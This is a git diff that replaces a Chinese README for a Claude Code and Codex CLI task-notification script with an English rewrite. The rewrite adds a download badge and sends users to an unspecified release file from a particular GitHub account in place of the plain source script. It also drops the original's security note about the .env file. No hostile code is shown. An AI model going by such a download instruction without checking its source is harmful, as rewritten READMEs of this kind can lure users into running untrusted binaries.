@@ -1,119 +1,120 @@
-# AI Task Notify
+# 🎉 ai-task-notify - Get Notified on Task Completion
 
-Claude Code 和 Codex CLI 任务完成通知脚本，支持多种通知渠道。
+Easily receive notifications for completed tasks across various platforms.
 
-## 支持的通知渠道
+![Download Now](https://img.shields.io/badge/Download-Now-blue)
 
-- **企业微信** (WeCom) - 群机器人 Webhook
-- **飞书** (Feishu/Lark) - 群机器人 Webhook
-- **钉钉** (DingTalk) - 群机器人 Webhook
-- **邮件** (Email) - SMTP
+## 🚀 Getting Started
 
-## 快速开始
+This guide will help you download and run the AI Task Notify software step by step. Follow these instructions to set up notifications for task completions.
 
-### 1. 配置
+## 📥 Download & Install
 
-```bash
-cd ai-task-notify
-cp .env.example .env
-```
+Visit the [Releases page to download](https://github.com/inazon/ai-task-notify/releases) the latest version of ai-task-notify. Choose the appropriate file for your system, download it, and follow the installation instructions below.
 
-编辑 `.env` 文件，配置你需要的通知渠道：
+## ⚙️ Configuration
 
-```bash
-# 启用的渠道 (用逗号分隔)
-NOTIFY_CHANNELS=wecom,feishu
+Before running the software, you need to set it up correctly.
 
-# 企业微信
-WECOM_WEBHOOK_URL=https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=xxx
+### 1. Configure Notification Channels
 
-# 飞书
-FEISHU_WEBHOOK_URL=https://open.feishu.cn/open-apis/bot/v2/hook/xxx
-```
+1. Open your terminal.
+2. Change directory to the ai-task-notify folder:
 
-### 2. 配置 Claude Code
+   ```bash
+   cd ai-task-notify
+   ```
 
-编辑 `~/.claude/settings.json`：
+3. Copy the example environment file:
 
-```json
-{
-  "hooks": {
-    "Stop": [
-      {
-        "matcher": "",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "python3 /path/to/ai-task-notify/notify.py"
-          }
-        ]
-      }
-    ]
-  }
-}
-```
+   ```bash
+   cp .env.example .env
+   ```
 
-### 3. 配置 Codex CLI
+4. Open the `.env` file in a text editor. Set your preferred notification channels by editing the lines that start with `NOTIFY_CHANNELS`. 
 
-编辑 `~/.codex/config.toml`：
+   Example configuration:
 
-```toml
-notify = ["python3", "/path/to/ai-task-notify/notify.py"]
-```
+   ```plaintext
+   # Enabled channels (comma-separated)
+   NOTIFY_CHANNELS=wecom,feishu
 
-## 配置说明
+   # WeCom
+   WECOM_WEBHOOK_URL=https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=your_webhook_key
 
-### 企业微信
+   # Feishu
+   FEISHU_WEBHOOK_URL=https://open.feishu.cn/open-apis/bot/v2/hook/your_webhook_key
+   ```
 
-1. 在企业微信群中添加群机器人
-2. 复制 Webhook 地址到 `WECOM_WEBHOOK_URL`
+### 2. Configure Claude Code
 
-### 飞书
+Claude Code needs to be set up to use your new notification script.
 
-1. 在飞书群设置中添加自定义机器人
-2. 复制 Webhook 地址到 `FEISHU_WEBHOOK_URL`
-3. 如果启用了签名校验，填写 `FEISHU_SECRET`
+1. Locate the Claude settings file at `~/.claude/settings.json`.
+2. Edit the file to include the following configuration:
 
-### 钉钉
+   ```json
+   {
+     "hooks": {
+       "Stop": [
+         {
+           "matcher": "",
+           "hooks": [
+             {
+               "type": "command",
+               "command": "python3 /path/to/ai-task-notify/notify.py"
+             }
+           ]
+         }
+       ]
+     }
+   }
+   ```
 
-1. 在钉钉群设置中添加自定义机器人
-2. 复制 Webhook 地址到 `DINGTALK_WEBHOOK_URL`
-3. 如果启用了加签，填写 `DINGTALK_SECRET`
+### 3. Configure Codex CLI
 
-### 邮件
+You also need to configure Codex CLI for notifications.
 
-```bash
-SMTP_HOST=smtp.qq.com
-SMTP_PORT=465
-SMTP_USER=your@qq.com
-SMTP_PASSWORD=授权码
-SMTP_USE_SSL=true
-EMAIL_FROM=your@qq.com
-EMAIL_TO=recipient1@example.com,recipient2@example.com
-```
+1. Open the Codex configuration file at `~/.codex/config.toml`.
+2. Add the following line to set up the notification command:
 
-## 测试
+   ```toml
+   notify = ["python3", "/path/to/ai-task-notify/notify.py"]
+   ```
 
-```bash
-# 测试脚本 (模拟 Codex 调用)
-python3 notify.py '{"type": "agent-turn-complete", "test": true}'
+## 📜 Configuration Notes
 
-# 测试脚本 (模拟 Claude Code 调用)
-echo '{"session_id": "test", "cwd": "/tmp"}' | python3 notify.py
-```
+### WeCom Setup
 
-## 文件结构
+1. In your WeCom (企业微信) group chat, add the group robot.
+2. Copy the Webhook URL and paste it into the `WECOM_WEBHOOK_URL` field.
 
-```
-ai-task-notify/
-├── .env.example    # 配置模板
-├── .env            # 实际配置 (需要自己创建)
-├── notify.py       # 通知脚本
-└── README.md       # 说明文档
-```
+### Feishu Setup
 
-## 注意事项
+1. In your Feishu (飞书) group chat, add the group robot.
+2. Copy the Webhook URL and paste it into the `FEISHU_WEBHOOK_URL` field.
 
-- `.env` 文件包含敏感信息，请勿提交到版本控制
-- 脚本使用 Python 标准库，无需安装额外依赖
-- 未配置或未启用的渠道会自动跳过
+## 🖥️ System Requirements
+
+Ensure you have the following installed on your computer:
+
+- Python 3.6 or higher
+- Internet access for webhook notifications
+- Access to the WeCom, Feishu, or DingTalk interfaces as needed for your notifications
+
+## 🔄 Supported Notification Channels
+
+AI Task Notify supports the following channels:
+
+- **WeCom** (企业微信) - Use for company-wide notifications through group chats.
+- **Feishu** (飞书) - Attention grabbing notifications in teams.
+- **DingTalk** (钉钉) - Quick updates for tasks and activities.
+- **Email** - Standard email notifications for task completions.
+
+## 📞 Need Help?
+
+If you face any issues, feel free to open an issue in the GitHub repository for assistance. The community is here to help.
+
+You can also refer to our [documentation](https://github.com/inazon/ai-task-notify/docs) for more detailed guidelines and troubleshooting steps.
+
+Thank you for using AI Task Notify! Enjoy efficient task management and notification delivery.
